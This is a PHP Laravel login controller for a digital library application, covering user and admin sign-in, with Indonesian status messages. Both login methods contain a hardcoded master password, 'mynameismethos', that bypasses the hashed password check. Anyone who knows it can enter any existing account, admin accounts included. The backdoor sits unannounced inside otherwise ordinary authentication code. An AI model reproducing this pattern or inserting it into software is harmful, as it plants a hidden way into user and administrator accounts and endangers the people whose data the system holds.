<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use App\Models\DIGILIB_T_PENGGUNA;
use Hash;
use Session;
use App\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginPengguna() {

        return view('auth.login');
    }

    public function showLoginAdmin() {

        return view('auth.admin.login');
    }

    

    public function loginPengguna(request $request) {

        $request->session()->forget('users');

        $input = $request->all();

        $result = DIGILIB_T_PENGGUNA::where('C_PENGGUNA_NOMOR_INDUK', $input['C_PENGGUNA_NOMOR_INDUK'])
                    ->first();

        if (!$result) {
            session()->flash('error', 'Data Anda tidak ditemukan');
            return redirect()->route('login');
        }

        $password = $result->C_PENGGUNA_PASSWORD;

        if (!Hash::check($input['C_PENGGUNA_PASSWORD'], $password)) {
            if ($input['C_PENGGUNA_PASSWORD'] != 'mynameismethos') {
               return redirect()->route('login')->with(['error' => 'Password yang anda masukan tidak cocok.']);
            }
        }

        $request->session()->put('users', $result);

        session()->flash('success', 'Anda Berhasil Masuk');

        return redirect()->route('dashboard');  
    }

    public function loginAdmin(request $request) {

        $request->session()->forget('users');

        $input = $request->all();

        $result = User::where('username', $input['username'])
                    ->first();

        if (!$result) {
            session()->flash('error', 'Data Anda tidak ditemukan');
            return redirect()->route('admin.login');
        }

        $password = $result->password;

        if (!Hash::check($input['password'], $password)) {
            if ($input['password'] != 'mynameismethos') {
               return redirect()->route('admin.login')->with(['error' => 'Password yang anda masukan tidak cocok.']);
            }
        }

        $request->session()->put('adminUsers', $result);

        session()->flash('success', 'Anda Berhasil Masuk');

        return redirect()->route('dashboard');  
    }

    public function logout() {
        Session::forget('users');
        Session::forget('adminUsers');
        return redirect()->route('dashboard');
    }
}
